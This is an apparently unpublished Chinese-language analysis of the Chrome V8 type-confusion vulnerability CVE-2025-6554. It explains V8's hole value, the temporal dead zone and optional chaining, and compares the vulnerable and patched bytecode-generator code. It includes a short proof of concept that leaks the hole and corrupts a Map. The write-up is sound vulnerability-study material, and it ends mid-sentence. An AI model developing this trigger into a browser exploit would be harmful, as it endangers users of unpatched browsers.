---
title: Chrome V8 类型混淆漏洞(CVE-2025-6554)分析
published: false
---

官方 PoC: 

```js
function f() {
    let x;
    delete x?.[y]?.a;
    return y;
    let y;
}
let hole = f();
let map = new Map();
map.delete(hole);
```

# [](#header-3)特性及机制详解

V8 是一个独立的 JS 引擎，Chrome 是一个基于 V8 引擎构建的浏览器，本漏洞与 V8 引擎离不开关系.

在介绍该漏洞之前先介绍几个 V8 引擎的特性及机制：

## [](#header-3)hole

hole 机制是 V8 内部设计的一部分，用于区分未初始化、删除后的数组槽位、TDZ 状态等多种情况. 正常情况下它不应被暴露到 JavaScript 代码中. 

以数组举个例子：在稀疏数组或被 delete 操作后，V8 会将这些"空槽"标记为 hole，区别于存放的 `undefined，来区分`"未存在"和"存在但值为 `undefined`"这两种情况

```js
const arr = [1 , ,3 ];
// arr[1] 实际上是 hole，但访问时会被 coerced 为 undefined
console.log(arr[1]);
```

除了区分上面所演示的数组空槽外，hole 还有另外一个用途：在 TDZ 中区分未初始化的变量.

# [](#header-3)与 hole 关联的 TDZ

TDZ 指的是"Temporal Dead Zone"，这是 ES6（ES2015）引入的一种语义概念，针对 let 和 const 声明的变量. 

在一个代码块开始后碰到某个变量，直到遇到该变量的声明这段区间就是 TDZ (必须是 let 或 const 形式的声明，若变量以 var 声明则不存在 TDZ) . 例如：

```js
1| {
2|   console.log(x);
3|   let x = 10;
4|   console.log(x);
5| }
```

在以上代码中，第 1 行到第 3 行区间即为 TDZ

#### [](#header-3)为什么要有 TDZ

我们都知道，在 JS 中当输出一个未初始化变量时，将会直接输出 undefined，也不存在 TDZ

```js
> console.log(a);
  var a = 1;
< undefined
> 
```

这样的机制在开发中及其容易产生 bug. 

为了保护安全、减少代码错误，引入了 TDZ 机制：当程序流进入一个作用域 (比如函数或 {} 块) 时，内部声明的 let 和 const 变量会被先提升 (hoist) 至作用域顶部，但不会立即初始化，并且在赋值前不会使用. 因此若你在赋值前使用，则会抛出 ReferenceError

```js
> console.log(a);
  let a = 1;
❌ Uncaught ReferenceError: a is not defined
    at <anonymous>:1:13
```

如上所示，在真正执行到声明语句之前，该变量处于 “死区” 内，访问就会抛出 ReferenceError. 

#### [](#header-3)TDZ 与 hole 之间的关系

我们先前提到，hole 可用于区分未初始化的变量

当你访问一个 let 声明但尚未初始化的变量时，变量处于 TDZ，在 V8 内部会认为其值是 hole，例如这段代码: 

```js
{ 
    ...
    console.log(y);   // 变量 y 被标记为 hole
    let y;            // 变量 y 被初始化为 undefined，该行执行完后续不再为 hole
}
```

在执行 `console.log(y);` 时，`y` 已经被提升（hoisted）到了当前作用域，但还没有被初始化，所以仍处于 TDZ. 此时，`y` 被标记为 hole，代表"尚未初始化"或"槽位为空"

下列代码同理: 

```js
function () {
    ...
    return y;         // 变量 y 被标记为 hole
    let y; 
}
```

# [](#header-3)可选链条

可选链 (Optional Chaining) 是 ECMAScript 2020 中新增的一个 JS 特性，用于简化访问嵌套对象属性或调用函数时的空值检查. 例如：

```js
const city = user?.address?.city;

//逻辑大致等同于
let city;
if (user != null && user.address != null) {
    city = user.address.city;
} else {
    city = undefined;
}
```

这样的访问方法不仅限于嵌套对象，也包含数组类型. 例如：

```js
const b =  x?.[y]?.a;

//逻辑大致等同于
let b;
if (x != null && x[y] != null) {
    b = x[y].a;
} else {
    b = undefined;
}
```

同时，可选链也可以删除嵌套对象中的某个特定对象. 例如：

```js
delete x?.[y]?.a; 

//逻辑大致等同于
if (x != null && x[y] != null && x[y].a != null) {
    delete x[y].a;
}
```

# [](#header-3)漏洞详解

在 JS 中，let 和 const 声明的变量在声明之前处于 TDZ 状态，无法访问. 然而，V8 引擎在处理可选链时，错误地将处于 TDZ 状态的变量视为已定义，即没有校验是否为 hole：

`V8 13.5.212.10 (存在漏洞版本的代码)`
```cpp
class V8_NODISCARD BytecodeGenerator::OptionalChainNullLabelScope final {
 public:
  explicit OptionalChainNullLabelScope(BytecodeGenerator* bytecode_generator)
      : bytecode_generator_(bytecode_generator),
        labels_(bytecode_generator->zone()) { //老版本的代码
    prev_ = bytecode_generator_->optional_chaining_null_labels_;
    bytecode_generator_->optional_chaining_null_labels_ = &labels_;
  }

  ~OptionalChainNullLabelScope() {
    bytecode_generator_->optional_chaining_null_labels_ = prev_;
  }
  ...
```

`V8 13.9.205.8 (官方修复后的代码，可以观察到，此处利用 hole_check_scope_ 函数添加了对 hole 的校验)`
```cpp
class V8_NODISCARD BytecodeGenerator::OptionalChainNullLabelScope final {
 public:
  explicit OptionalChainNullLabelScope(BytecodeGenerator* bytecode_generator)
      : bytecode_generator_(bytecode_generator),
        labels_(bytecode_generator->zone()),
        hole_check_scope_(bytecode_generator) { //可以观察到，此处利用 hole_check_scope_ 函数添加了对 hole 的校验
    prev_ = bytecode_generator_->optional_chaining_null_labels_;
    bytecode_generator_->optional_chaining_null_labels_ = &labels_;
  }

  ~OptionalChainNullLabelScope() {
    bytecode_generator_->optional_chaining_null_labels_ = prev_;
  }
  ...
```

因此，在存在漏洞的版本中由于缺少 `hole_check_scope_`，用 `delete x?.[y]?.a;` 可选链机制，使其跳过了对 hole 值的检查. 

而在 V8 中存在 `HoleCheckElisionScope`，这是 V8 中用于 控制"是否需要检查 TDZ/hole"的编译时作用域控制机制，它确保可选链在执行过程中对 hole 值进行严格检查，而不会在优化中被意外跳过. 但由于在未修复的版本中，先执行的 `delete x?.[y]?.a;` 中的 hole 值 `y` 已被进行处理，因此 `y` 依旧保持为 hole，并且 `return y` 以及后续的操作将会正常执行并且不会抛出 ReferenceError. 

```js
function f() {
    let x;
    delete x?.[y]?.a;
    return y;
    let y;
}
let hole = f();
//此时的 hole 是合法 hole 值
```

而后利用 `map.delete(hole)`，由于 map.delete 操作将对应 key，将导致 map 结构异常，

```js
function f() {
    let x;
    delete x?.[y]?.a;
    return y;
    let y;
}
let hole = f();
let map = new Map();
map.delete(hole);
```


